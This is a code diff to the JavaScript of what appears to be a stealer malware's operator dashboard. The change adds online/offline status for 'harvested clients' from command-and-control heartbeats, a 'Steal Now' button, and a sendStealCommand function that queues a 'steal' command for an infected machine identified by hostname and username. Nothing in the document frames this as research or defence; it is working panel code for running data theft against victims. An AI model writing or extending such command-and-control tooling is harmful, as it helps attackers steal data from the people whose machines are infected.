@@ -704,16 +704,23 @@ async function loadDashboardStats() {
 }
 
 // 2. Clients Horizontal list
-function renderClientRow(log) {
+function renderClientRow(log, isOnline) {
     const row = document.createElement('div');
     row.className = 'client-row';
     row.dataset.id = log.id;
 
     const dateStr = formatDate(log.created_at);
+    const statusClass = isOnline ? 'status-online' : 'status-offline';
+    const statusText = isOnline ? 'Online' : 'Offline';
+    const clientId = log.hostname + '_' + log.username;
 
     row.innerHTML = `
         <div class="client-checkbox">
             <input type="checkbox" data-log-id="${log.id}" onchange="updateBulkActions()">
+        </div>
+        <div class="client-status-pill ${statusClass}">
+            <span class="status-dot"></span>
+            <span class="status-text">${statusText}</span>
         </div>
         <div class="client-info-user">
             <strong>${escapeHtml(log.username)}</strong>
@@ -724,6 +731,9 @@ function renderClientRow(log) {
         <div class="client-info-files"><span>${log.file_count} files</span></div>
         <div class="client-info-date">${dateStr}</div>
         <div class="client-info-actions">
+            ${isOnline ? `<button class="btn-icon btn-icon-success" onclick="sendStealCommand('${escapeHtml(clientId)}')" title="Steal Now">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+            </button>` : ''}
             <button class="btn-icon" onclick="viewLogDetails(${log.id})" title="Inspect">
                 <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
             </button>
@@ -768,9 +778,19 @@ async function loadClients() {
         container.innerHTML = `<div class="empty-state py-8">Loading client list...</div>`;
         document.getElementById('bulk-actions').classList.remove('visible');
 
-        const url = `/api/logs?page=${currentPage}&limit=${logsLimit}&search=${encodeURIComponent(searchQuery)}`;
-        const response = await fetch(url);
-        const data = await response.json();
+        const [logsRes, c2Res] = await Promise.all([
+            fetch(`/api/logs?page=${currentPage}&limit=${logsLimit}&search=${encodeURIComponent(searchQuery)}`),
+            fetch('/api/c2/clients')
+        ]);
+        const data = await logsRes.json();
+        const c2Clients = await c2Res.json();
+
+        const onlineSet = new Set();
+        const now = Date.now();
+        c2Clients.forEach(c => {
+            const hb = new Date(c.last_heartbeat + 'Z').getTime();
+            if (now - hb < 60000) onlineSet.add(c.client_id);
+        });
 
         if (!data.logs || data.logs.length === 0) {
             container.innerHTML = `<div class="empty-state py-8">No harvested clients found.</div>`;
@@ -781,7 +801,9 @@ async function loadClients() {
 
         container.innerHTML = '';
         data.logs.forEach(log => {
-            container.appendChild(renderClientRow(log));
+            const clientId = log.hostname + '_' + log.username;
+            const isOnline = onlineSet.has(clientId);
+            container.appendChild(renderClientRow(log, isOnline));
         });
 
         document.getElementById('current-page').innerText = data.page;
@@ -916,6 +938,22 @@ function quickDeleteLog(id, btnEl) {
             }
         }
     });
+}
+
+// C2 Command
+async function sendStealCommand(clientId) {
+    try {
+        const res = await fetch('/api/c2/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ client_id: clientId, command: 'steal' })
+        });
+        if (res.ok) {
+            showToast('Command sent', `Steal command queued for ${clientId}`);
+        }
+    } catch (e) {
+        console.error('Failed to send command:', e);
+    }
 }
 
 // 4. Settings Loader & Saver
